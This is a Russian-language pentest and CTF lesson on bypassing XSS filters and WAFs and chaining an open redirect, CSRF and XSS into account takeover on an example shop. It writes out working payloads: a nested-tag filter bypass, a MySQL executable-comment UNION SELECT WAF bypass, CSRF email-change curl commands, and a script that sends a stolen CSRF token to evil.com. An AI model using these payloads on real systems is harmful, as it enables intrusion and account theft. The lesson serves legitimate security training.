## Задача

Одиночные баги часто закрыты фильтрами и WAF. Реальный эксперт умеет две вещи: **обходить защиту** (когда payload блокируется) и **связывать мелкие баги в цепочку** (когда по отдельности они «низкие», а вместе дают критичный результат).

Разберём магазин: обойдём фильтр и соберём цепочку из трёх шагов.

## Наш пример: поиск с фильтром

На странице поиска есть фильтр, который вырезает опасные символы:

```bash
$ curl -s 'https://shop.local/search?q=<script>alert(1)</script>' | grep -o 'alert'
# пусто — теги вырезаны
$ curl -s 'https://shop.local/search?q=<scr<script>ipt>alert(1)</script>' | grep -o 'alert(1)'
alert(1)
```

Мы вставили `<script>` **внутрь** другого `<script>`: фильтр вырезал внутренний тег, а внешние склеились в рабочий. Это классический обход «вырезания по шаблону». Такой фильтр — не защита, а препятствие, которое обходят.

## Шаг 1: систематика обходов фильтров

- **Двойное написание:** `<scr<script>ipt>` — после удаления остаётся `<script>`.
- **Регистр и пробелы:** `<ScRiPt>`, `<script%09>`, `<script\n>`.
- **Кодировки:** `%3Cscript%3E`, `&#60;script&#62;`, `\u003cscript\u003e`.
- **Альтернативные векторы:** `<img src=x onerror=...>`, `<svg onload=...>`, `<iframe srcdoc=...>`.
- **Разные контексты:** не только HTML, но атрибут (`" onmouseover=`), JS-строка (`</script>`).

Правило: **понять, что именно фильтр удаляет, и собрать payload, который после удаления станет рабочим.**

## Шаг 2: обход WAF через расхождение парсеров

WAF и приложение могут по-разному разбирать один запрос. Используем это:

```bash
$ curl -s 'https://shop.local/api/user?id=1%20UNION%20SELECT%20pass%20FROM%20users' -o /dev/null -w '%{http_code}\n'
403   # WAF заблокировал

$ curl -s 'https://shop.local/api/user?id=1/*!50000UNION*/SELECT%20pass%20FROM%20users' -o /dev/null -w '%{http_code}\n'
200   # MySQL-комментарий обошёл WAF
```

Конструкция `/*!50000UNION*/` — «исполняемый комментарий» MySQL: приложение выполняет `UNION`, а WAF видит комментарий. Это **обход через расхождение парсеров**.

## Шаг 3: собираем цепочку из трёх шагов

По отдельности три находки «низкие». Свяжем их в один сценарий компрометации:

1. **Открытый редирект** на `/login?next=...`:

```bash
$ curl -sI 'https://shop.local/login?next=https://evil.com' | grep -i location
Location: https://evil.com
```

2. **Слабый CSRF** на смене email (нет токена) — из прошлого урока.
3. **XSS** в поле профиля (self-XSS, требует, чтобы жертва ввела сам).

Цепочка: открытый редирект → `https://evil.com` → фишинговая страница, ведущая на настоящий `/login` → жертва логинится (доверяя домену) → наша страница шлёт CSRF на смену email → затем XSS через сохранённое поле.

```bash
# 1. жертва открывает https://shop.local/login?next=https://evil.com
# 2. evil.com редиректит обратно на shop.local и логинит
# 3. пока жертва на странице — отправляем CSRF на смену email
$ curl -s -b victim.txt -d 'email=attacker@evil.com' https://shop.local/settings/email
{"status":"ok"}
# 4. запрашиваем сброс пароля на новый email -> аккаунт захвачен
```

Три «низких» бага вместе = **полный захват аккаунта**.

## Шаг 4: почему цепочки важны в отчётах

Сканер сообщит три отдельных «low/medium». Но бизнес-риск определяется **итогом цепочки**. В отчёте это выглядит так:

| Шаг | Баг | Один | В цепочке |
|-----|-----|------|-----------|
| 1 | open redirect | low | усилитель доверия |
| 2 | CSRF | medium | меняет email |
| 3 | XSS | medium | выполняет действие |
| Итог | — | — | захват аккаунта |

Умение строить цепочку — то, что отличает формальный скан от реального пентеста.

## Шаг 5: как строить цепочки системно

- **Собери инвентарь:** список всех находок, включая «низкие».
- **Ищи мосты:** что читает одно и питает другое (редирект → доверие, XSS → CSRF).
- **Проверь порядок:** цепочка должна быть воспроизводима шаг за шагом.
- **Задокументируй каждый шаг:** с запросом и ответом — иначе цепочку не примут.
- **Думай о цели:** «к чему я хочу прийти» (RCE, захват, утечка) и подбирай шаги под цель.

## Если не сработало

- **Фильтр не обходится** — смени контекст (атрибут, JS, URL) или вектор (`svg`, `img`).
- **WAF блокирует всё** — ищи расхождение парсеров (комментарии, кодировки, `Content-Type`).
- **Цепочка рвётся** — проверь, есть ли на «мосту» дополнительная защита (SameSite, CSP).
- **Мало находок** — вернись к разведке: цепочка строится из полного инвентаря.

## Что мы теперь знаем

- Фильтр, удаляющий по шаблону, обходится вложенностью (`<scr<script>ipt>`).
- WAF обходится расхождением парсеров (исполняемые комментарии, кодировки).
- Цепочка связывает мелкие баги в критичный итог (захват аккаунта).
- Ценность находки определяется итогом цепочки, а не severity одного шага.

## Частые вопросы

**Зачем вообще обходить WAF, если баг и так есть?** Иногда баг есть, но payload блокируется — тогда обход **открывает** доступ к багу. Без обхода ты его не докажешь.

**Фильтр, который удаляет теги, — плохая защита?** Да: удаление по шаблону обходится вложенностью (`<scr<script>ipt>`), регистром, кодировкой. Надёжен только контекстный вывод (экранирование).

**Что такое цепочка на практике?** Последовательность шагов, где каждый усиливает следующий: редирект → фишинг, XSS → CSRF, утечка → подделка токена.

**Как понять, что цепочка «принята»?** Если каждый шаг воспроизводим и вместе они дают **критичный** итог (захват аккаунта, RCE). Без воспроизводимости это догадка.

**Всегда ли нужно много багов?** Нет: одна уязвимость + слабая защита (например, отсутствие привязки токена) уже образуют цепочку.

**Что важнее — широта или глубина?** Для отчёта — **глубина**: доказанный захват аккаунта ценнее десяти «low».

## Ещё один сценарий: цепочка «утечка токена → CSRF → захват»

Разберём цепочку от утечки до захвата аккаунта. Начнём с XSS, который ворует CSRF-токен:

```html
<script>fetch('https://evil.com/collect?t='+document.querySelector('[name=csrf]').value)</script>
```

Затем, зная токен, шлём смену email от имени жертвы:

```bash
$ curl -s -b victim.txt -d 'email=attacker@evil.com&csrf=STOLEN' https://shop.local/settings/email
{"status":"ok"}
```

Наконец — сброс пароля на новый email:

```bash
$ curl -s -d 'email=attacker@evil.com' https://shop.local/password/reset
{"status":"sent"}
$ # токен сброса приходит нам -> смена пароля -> захват
```

Три шага, каждый по отдельности «средний», вместе — полный захват.

## На что смотреть дальше

- **Инвентарь.** Собери все находки, включая «low» — они звенья цепочек.
- **Мосты.** Что питает что: XSS → CSRF, утечка → подделка токена, редирект → фишинг.
- **Защиты на пути.** SameSite, CSP, анти-CSRF-токен — проверь каждую.
- **Воспроизводимость.** Каждый шаг с запросом/ответом, иначе цепочку не примут.
- **Цель.** Определи финал (RCE/захват/утечка) и подбери шаги под него.
- **Обходы.** Если фильтр мешает — кодировки, комментарии, расхождение парсеров.

## Куда дальше

На этом ветвь бизнес-логики завершена. Дальше — разведка (`web-recon-fuzzing`) и SSRF (`web-ssrf`). А пока главное запомни: **фильтр обходится знанием его правил, а сила — в цепочке, а не в отдельном баге.**

## Где пригодится

- **CTF:** закрепление темы в задачах категории Web.
- **Bug bounty:** приоритизация находок и построение отчётов.
- **Пентест:** планирование этапов тестирования веб-приложения.
- **Работа:** понимание, какие классы багов критичны для защиты продукта.
